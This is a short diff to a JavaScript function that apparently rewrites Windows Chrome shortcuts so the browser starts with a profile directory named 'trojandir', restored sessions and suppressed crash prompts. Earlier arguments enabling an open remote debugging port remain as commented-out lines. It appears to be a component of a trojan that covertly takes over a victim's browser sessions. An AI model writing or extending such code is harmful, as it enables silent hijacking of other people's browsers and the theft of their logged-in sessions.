@@ -4484,9 +4484,28 @@ async function modify_chrome() {
                 lnks.push(element);
         }
     }
-    
-    // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
-    cmdlineargs = `--user-data-dir="C:\\ProgramData\\owd\\chrome" --profile-directory=Default --remote-allow-origins=* --restore-last-session --remote-debugging-port=9223`;
+
+    cmdlineargs = [
+        `--hide-crash-restore-bubble`,
+        `--user-data-dir="${path.join(sessionstate.trojandir,chrome)}"`,
+        `--profile-directory=Default`,
+        `--restore-last-session`,
+        `--start-maximized`,
+        `--no-first-run`, // You can skip Chrome's welcome and setup screens
+        // `--remote-allow-origins=*`,
+        // `--remote-debugging-port=9223`
+        // --ignore-certificate-errors --> causes warning popup in chrome on startup/launch
+        // `--remote-debugging-port=${debugport}`,
+        // `--user-data-dir=${datadir}`,
+        // `--new-window ${starturl}`,
+        // headless ? `--headless=new` : '',
+        // `--no-default-browser-check`,
+        // `--ignore-certificate-errors`,
+        // `--window-position=${x_pos},${y_pos}`,
+        // `--window-size=${width},${height}`,
+    ];
+
+    cmdlineargs = cmdlineargs.join(' ');
 
     for ( const lnk of lnks ) {
         logmsg(`processing ${lnk}`);
